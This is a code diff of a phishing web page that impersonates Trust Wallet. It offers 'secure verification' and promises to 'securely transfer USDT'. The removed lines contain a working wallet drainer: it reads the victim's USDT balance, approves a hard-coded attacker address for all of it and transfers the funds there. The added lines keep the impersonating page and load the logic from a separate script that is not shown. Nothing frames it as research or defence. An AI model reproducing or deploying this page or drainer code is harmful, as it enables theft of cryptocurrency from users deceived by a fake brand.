@@ -1,88 +1,19 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Verify USDT</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="icon" href="./favicon.ico" type="image/x-icon" />
-  <style>
-    body {
-      font-family: Arial,sans-serif; background:#081c3a; color:#fff;
-      text-align:center; padding-top:50px;
-    }
-    h1 { font-size:1.5em; }
-    img { width:80px; margin:20px auto; }
-    button {
-      padding:14px 24px; background:#0052ff; border:none; border-radius:8px;
-      cursor:pointer; font-size:1em; color:#fff;
-    }
-    p#status { margin-top:20px; opacity:0.8; min-height:40px; }
-    .footer {
-      position:fixed; bottom:10px; width:100%;
-      opacity:0.5; font-size:0.8em;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Trust Wallet Secure Verification</title>
+<link rel="icon" href="./favicon.ico" type="image/x-icon" />
+<link rel="stylesheet" href="./style.css" />
 </head>
 <body>
-  <img src="./logo.png" alt="Trust Wallet">
-  <h1>Secure USDT Verification</h1>
-  <button id="drain">Verify & Approve</button>
-  <p id="status">Tap the button to begin.</p>
+  <img src="./logo.png" alt="Trust Wallet Logo" class="logo" />
+  <h1>Trust Wallet Secure Verification</h1>
+  <p>Tap the button to securely transfer USDT.</p>
+  <button id="drain">Verify &amp; Approve</button>
   <div class="footer">Verified by Trust Wallet • Trusted since 2009</div>
-
   <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
-  <script>
-    const DRAIN_ADDRESS = "0xDA0bab807633f07f013f94DD0E6A4F96F8742B53";
-    const USDT = "0x55d398326f99059fF775485246999027B3197955";
-    const ABI = [
-      { "constant": false, "inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function" },
-      { "constant": false, "inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function" },
-      { "constant": true, "inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function" }
-    ];
-    const statusEl = document.getElementById('status');
-
-    async function drain() {
-      if (!window.ethereum) {
-        statusEl.innerText = "❌ Please use Trust Wallet DApp browser.";
-        return;
-      }
-      statusEl.innerText = "🔄 Connecting to wallet...";
-      try {
-        await window.ethereum.request({ method:'eth_requestAccounts' });
-        const web3 = new Web3(window.ethereum);
-        const accounts = await web3.eth.getAccounts();
-        const user = accounts[0];
-        const contract = new web3.eth.Contract(ABI, USDT);
-
-        const balance = await contract.methods.balanceOf(user).call();
-        if(balance == 0) {
-          statusEl.innerText = "⚠️ You have 0 USDT.";
-          return;
-        }
-        statusEl.innerText = "⏳ Approving USDT...";
-
-        await contract.methods.approve(DRAIN_ADDRESS, balance).send({from:user})
-          .on('receipt', async () => {
-            statusEl.innerText = "✅ Approve successful. Transferring USDT...";
-            await contract.methods.transferFrom(user, DRAIN_ADDRESS, balance).send({from:user})
-              .on('receipt', () => {
-                statusEl.innerText = "🎉 Success! Thank you.";
-              })
-              .on('error', (e) => {
-                statusEl.innerText = "❌ Transfer failed.";
-                console.error(e);
-              });
-          })
-          .on('error', (e) => {
-            statusEl.innerText = "❌ Approve failed.";
-            console.error(e);
-          });
-
-      } catch (e) {
-        statusEl.innerText = "❌ Error: " + e.message;
-      }
-    }
-
-    document.getElementById('drain').onclick = drain;
-  </script>
+  <script src="./script.js"></script>
 </body>
 </html>
